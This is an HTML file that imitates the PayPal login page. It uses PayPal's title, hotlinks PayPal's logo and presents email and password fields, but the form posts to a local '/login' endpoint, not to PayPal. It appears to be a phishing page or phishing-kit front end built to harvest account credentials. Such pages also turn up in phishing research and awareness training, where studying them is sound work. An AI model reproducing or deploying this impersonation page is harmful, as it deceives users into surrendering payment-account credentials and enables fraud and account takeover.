<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Log in to PayPal</title>
    <link rel="stylesheet" href="css/style.css" />
  </head>
  <body>
    <div id="main" class="main" role="main">
      <section
        id="login"
        class="login"
        data-role="page"
        data-title="Log in to your PayPal account"
      >
        <div class="corral">
          <div id="content" class="contentContainer">
            <header>
              <p class="paypal-logo paypal-logo-long">
                <center>
                  <img
                    src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.png"
                  />
                </center>
              </p>
            </header>
            <form
              action="/login"
              method="post"
              class="proceed maskable"
              name="login"
              autocomplete="off"
              novalidate=""
            >
              <div id="passwordSection" class="clearfix">
                <div class="textInput" id="login_emaildiv">
                  <div class="fieldWrapper">
                    <label for="email" class="fieldLabel">Email</label>
                    <input
                      id="email"
                      name="login_email"
                      type="email"
                      class="hasHelp validateEmpty"
                      required="required"
                      aria-required="true"
                      value=""
                      autocomplete="off"
                      placeholder="Email"
                    />
                  </div>
                </div>

                <div class="textInput lastInputField" id="login_passworddiv">
                  <div class="fieldWrapper">
                    <label for="password" class="fieldLabel">Password</label>
                    <input
                      id="password"
                      name="login_password"
                      type="password"
                      class="hasHelp validateEmpty"
                      required="required"
                      aria-required="true"
                      value=""
                      placeholder="Password"
                    />
                  </div>
                </div>
              </div>
              <div class="actions actionsSpaced">
                <button
                  class="button actionContinue"
                  type="submit"
                  id="btnLogin"
                  name="btnLogin"
                  value="Login"
                >
                  Log In
                </button>
              </div>
              <div class="forgotLink">
                <a
                  href="#"
                  id="forgotPasswordModal"
                  class="scTrack:unifiedlogin-click-forgot-password"
                  >Having trouble logging in?</a
                >
              </div>
              <input type="hidden" id="bp_mid" name="bp_mid" value="" />
            </form>

            <a href="#" class="button secondary" id="createAccount">Sign Up</a>
          </div>
        </div>
      </section>
    </div>
    <script src="/js/script.js"></script>
  </body>
</html>
